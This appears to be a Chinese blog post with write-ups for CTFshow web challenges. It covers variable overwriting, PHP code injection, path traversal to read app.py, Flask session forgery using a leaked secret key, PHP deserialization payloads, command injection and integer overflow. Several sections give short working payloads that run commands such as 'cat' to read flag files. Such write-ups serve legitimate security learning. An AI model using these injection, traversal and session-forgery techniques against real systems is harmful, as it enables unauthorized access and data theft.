---
description: '整理 CTFshow 菜狗杯部分 Web 题目的解题思路和利用过程。'
title: CTFshow 菜狗杯 Web 部分题解
date: 2024-01-20 21:57:13
top_img: /img/2abc3f959e3c1983556049fa213be07c.jpg
tags: [CTF,WP,ctshow]
categories: [CTF,WP]
toc: true
toc_number: true
mathjax: false
katex: false
comments: true
---

## web 签到

套娃（bp 和 hackbar 都行）

cookie->post->get->requst

{% asset_img e81f7f74-39ed-4afc-8470-8cdfc46d88af-20250120220429-rpo6s48.png web2解题过程截图 %}

requst 没固定什么传参，但是试了一下好像 get 不行？(不知道是不是自己的问题；

## web2 c0me\_t0\_s1gn

F12 获得第一部份

跟着提示

{% asset_img e81f7f74-39ed-4afc-8470-8cdfc46d88af-20250120220429-rpo6s48.png web2解题过程截图 %}

## 我的眼里只有\$

变量覆盖

{% asset_img 7047fcf2-e9b7-4a4e-9d03-55fc257a1a3b-20250120220847-5ztfyev.png 变量覆盖题目截图 %}

37-1 个

```html
_=a&a=b&b=c&c=d&d=e&e=f&f=g&g=h&h=i&i=j&j=k&k=l&l=m&m=n&n=o&o=p&p=q&q=r&r=s&s=t&t=u&u=v&v=w&w=x&x=y&y=z&z=aa&aa=bb&bb=cc&cc=dd&dd=ee&ee=ff&ff=gg&gg=hh&hh=ii&ii=system('cat /f1agaaa');
```

## 抽老婆

session 伪造

没思路，抓个包然后每个按钮按一遍

{% asset_img b37d12a6-96b6-4b4b-96c4-d4c0729f07b7-20250120230512-x7gczz3.png 抽老婆界面截图 %}
{% asset_img 8e4361d2-c0f0-49b3-80a7-0a18dfbc8f0d-20250120224013-o2crfg2.png 下载功能截图 %}

session 和/download?file=,有点说法,试试 file=1，看到 app.py,看看能不能搞下来，然后瞎几把试了一堆用 flie=../../app.py(相对路径)弄出来了,得到源码

{% asset_img 0d55845e-d5b3-43e9-9189-407903e8057c-20250120224106-0ubwoz6.png 文件读取截图 %}
{% asset_img 6b1a2089-86cc-42e5-9e8c-6ffa529ab935-20250120224405-0644iki.png 源码获取截图 %}

key:tanji_is_A_boy_Yooooooooooooooooooooo!

路径:/secret_path_U_never_know

结合源码，然后百度了一下身份验证，确定是 session 伪造 也就是 session['isadmin']=False->session['isadmin']=Ture

使用 flask_session_cookie_manager3.py

{% asset_img bc84b2c7-26a0-4a30-b385-2b5b03dfe264-20250120225805-l37zwl9.png Session伪造工具截图 %}
{% asset_img 85128124-4a9d-4c77-855f-794ff2a5d15c-20250120230108-rcazsxm.png 伪造成功截图 %}

## 一言既出

琢磨半天 inval,一看 wp 是闭合...

?num=114514);(19199810

?num=114514);//等等

## 驷马难追

多了个正则匹配,但是这个依旧能打

?num=114514);(19199810

## TapTapTap

F12 观察一遍发现 js/habibiScript.js 有点可疑,然后打开发现 base64 编码,解码访问即可

{% asset_img 81a98378-3848-4f22-bdff-c87f5c3050cd-20250120232801-9gqpzac.png JS文件发现截图 %}
{% asset_img 092d7293-c681-4bbb-98c6-9f771301b2c9-20250120232922-1yes3ir.png Base64解码截图 %}

## Webshell

反序列化

```PHP
<?php 
class Webshell {
    public $cmd = 'cat fl*';
}
$a = new Webshell();
echo serialize($a);
?>
```

## 化零为整

count($_GET) 统计传参个数

strlen()<1 每个参数只能占用一个字节

把大牛 url 后分开传入就行了   大牛->%E5%A4%A7%E7%89%9B

?1=%E5&2=%A4&3=%A7&4=%E7&5=%89&6=%9B

## 无一幸免

?0=传啥都行

## 无一幸免\_FIXED

数组整型溢出判断为真 int 范围可知：32 位最大是 2<sup>31</sup>-1，64 位是 2<sup>63</sup>-1

?0=9223372036854775807

## 传说之下（雾）

代码审计，cmd 和 param，cmd 控制前三个字符当作命令，param 当作参数,这还有个 evilSource.py,点进去看看

{% asset_img a05c8a5f-ab6b-466e-a05f-d9409899ee5a-20250122211814-04yifpv.png 题目界面截图 %}
{% asset_img 8542a044-34bf-471a-9f54-cc0792a9136c-20250122211929-ki0hmu6.png 源码分析截图 %}

发现 flag.txt  payload:cmd=cat&param=flag.txt

## 遍地飘零

代码审计，应该是变量覆盖，通过执行 var_dump(flag)来显示 flag 的值

也就是说 $_GET=flag,传一下试试，发现成功了

当然重点还有 foreach()

foreach($GET as$ key=>value)会遍历所有通过 URL 传递的 GET 参数。
每次循环中，$key是参数名，$ value 是参数值

然后把 value 的变量的值赋给名为 key 的变量

## 茶歇区

瞎几把乱填发现这个 9223372036854775807，看这个数字挺熟悉的然后查资料估计是要溢出

{% asset_img ae364b44-526b-4257-9660-47c5d5529f4b-20250122214651-hp5r300.png 茶歇区界面截图 %}

通过一个个传入 9223372036854775807 发现回显不同，矿泉水火腿肠一样，饮料和面包一样，所以可以指向咖啡这个特立独行的家伙，传入一次 9223372036854775807 后再传入两次 99999999999999999999 就获得 flag 了

（为什么是 99999999999999999999 呢，其实传一个比 9223372036854775807 大挺多的数字就行,但是又不能大太多，也懒得去试了）

## 小舔田？

Moon的__toString()->Ion_Fan_Princess的__toString()->call()

```PHP
<?php
class Moon{
    public $name;
}
 
class Ion_Fan_Princess{
    public $nickname="小甜甜";
 
}
$a = new Moon();
$b = new Ion_Fan_Princess();
$a->name=$b;
echo serialize($a);
```

## LSB探姬

先看源码，发现flag.py以及有文件名的命令执行

{% asset_img 0c9841d54f5d193146c66cdd373e6ae5-20250122224401-9sk36lk.png 源码查看截图 %}

然后bp拦截改包

{% asset_img c0d4319a-97b8-4d0e-8097-4d8e5275de85-20250122224938-zrcq9jm.png 请求拦截截图 %}
{% asset_img 13d3107c-516b-4847-8753-b98a0042dee3-20250122224713-932k1sm.png 响应结果截图 %}

‍

